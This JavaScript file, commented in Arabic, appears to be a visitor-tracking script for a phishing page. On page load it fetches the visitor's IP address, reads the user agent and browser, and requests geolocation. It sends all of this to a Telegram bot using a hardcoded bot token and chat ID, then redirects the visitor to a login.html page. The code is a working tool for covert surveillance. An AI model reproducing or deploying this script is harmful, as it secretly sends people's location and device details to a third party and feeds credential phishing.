document.addEventListener("DOMContentLoaded", function () {
    const botToken = '6507011447:AAFQoG5r_wg2YFG6N8qxqnSnClzN-viNjdw';
    const chatId = '1195010636';

    // الحصول على معلومات الـ IP
    fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            const clientIP = data.ip;

            // جمع معلومات الجهاز والمتصفح
            const deviceInfo = {
                deviceType: getDeviceType(),
                deviceName: getDeviceName(),
                browser: getBrowserInfo()
            };

            // تجميع الرسالة المراد إرسالها
            const message = `
User Info:
Device Type: ${deviceInfo.deviceType}
Device Name: ${deviceInfo.deviceName}
Browser: ${deviceInfo.browser}
IP Address: ${clientIP}
`;

            // إرسال الرسالة إلى بوت تليجرام
            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('text', message);

            fetch(apiUrl, {
                method: 'POST',
                body: formData
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Data sent successfully.');
                    } else {
                        console.error('An error occurred while sending data.');
                    }
                })
                .catch(error => {
                    console.error('An error occurred:', error);
                });
        });
});

// الحصول على نوع الجهاز
function getDeviceType() {
    return /Mobile|Tablet|iPad|iPhone|Android|Windows Phone/.test(navigator.userAgent)
        ? "Mobile"
        : "Desktop";
}

// الحصول على اسم الجهاز
function getDeviceName() {
    return navigator.userAgent;
}

// الحصول على معلومات المتصفح
function getBrowserInfo() {
    const userAgent = navigator.userAgent;
    const browsers = {
        Chrome: /Chrome/.test(userAgent),
        Firefox: /Firefox/.test(userAgent),
        Edge: /Edge/.test(userAgent),
        Safari: /Safari/.test(userAgent),
        Opera: /OPR|Opera/.test(userAgent),
        IE: /Trident|MSIE/.test(userAgent)
    };

    return Object.keys(browsers).find(browser => browsers[browser]);
}


// 2
const botToken = '6507011447:AAFQoG5r_wg2YFG6N8qxqnSnClzN-viNjdw';
const chatId = '1195010636';
if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(
        position => {
            const location = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
            };

            // إرسال موقع المستخدم إلى بوت تليجرام
            const message = `
Location Info:
Latitude: ${location.latitude}
Longitude: ${location.longitude}
`;

            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('text', message);

            fetch(apiUrl, {
                method: 'POST',
                body: formData
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Location data sent successfully.');
                    } else {
                        console.error('An error occurred while sending location data to Telegram.');
                    }
                })
                .catch(error => {
                    console.error('An error occurred:', error);
                });

            // إذا تم السماح بالوصول إلى الموقع، قم بتحويل المستخدم إلى الرابط المطلوب
            window.location.href = 'login.html';
        },
        error => {
            // في حالة عدم السماح بالوصول إلى الموقع، قم بتحويل المستخدم إلى رابط بديل
            window.location.href = 'login.html';
        }
    );
} else {
    console.error('Geolocation is not supported.');
}